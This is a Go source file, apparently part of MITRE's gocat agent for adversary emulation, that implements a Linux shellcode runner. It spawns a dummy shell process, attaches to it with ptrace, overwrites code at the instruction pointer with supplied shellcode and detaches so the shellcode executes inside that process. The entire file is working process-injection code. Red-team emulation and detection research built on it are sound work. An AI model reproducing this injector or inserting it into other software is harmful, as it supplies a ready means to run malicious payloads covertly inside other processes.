// +build linux

package shellcode

import (
	"os/exec"
	"strconv"
	"syscall"

	"github.com/mitre/gocat/output"
)

// Runner runner
func Runner(shellcode []byte) (bool, string) {
	tPid := generateDummyProcess()
	if tPid == 0 || !attachToProcessAndWait(tPid) {
		return false, strconv.Itoa(tPid)
	}
	registers := getRegisters(tPid)
	if registers == (syscall.PtraceRegs{}) || !copyShellcode(tPid, shellcode, uintptr(registers.PC())) || !setRegisters(tPid, registers) || !detachFromProcess(tPid) {
		return false, strconv.Itoa(tPid)
	}
	return true, strconv.Itoa(tPid)
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	return true
}

func generateDummyProcess() int {
	cmd := exec.Command("sh")
	cmdErr := cmd.Start()
	if cmdErr != nil {
		output.VerbosePrint(cmdErr.Error())
	}
	return cmd.Process.Pid
}

func attachToProcessAndWait(tPid int) bool {
	var status syscall.WaitStatus
	attachErr := syscall.PtraceAttach(tPid)
	if !checkForFailure(attachErr) {
		return false
	}
	_, waitErr := syscall.Wait4(tPid, &status, syscall.WALL, nil)
	return checkForFailure(waitErr)
}

func detachFromProcess(tPid int) bool {
	detachErr := syscall.PtraceDetach(tPid)
	return checkForFailure(detachErr)
}

func copyShellcode(pid int, shellcode []byte, dst uintptr) bool {
	_, copyErr := syscall.PtracePokeData(pid, dst, shellcode)
	return checkForFailure(copyErr)
}

func getRegisters(pid int) syscall.PtraceRegs {
	var regs syscall.PtraceRegs
	regsErr := syscall.PtraceGetRegs(pid, &regs)
	if !checkForFailure(regsErr) {
		return syscall.PtraceRegs{}
	}
	return regs
}

func setRegisters(pid int, regs syscall.PtraceRegs) bool {
	regsErr := syscall.PtraceSetRegs(pid, &regs)
	return checkForFailure(regsErr)
}

func checkForFailure(err error) bool {
	if err != nil {
		output.VerbosePrint(err.Error())
		return false
	}
	return true
}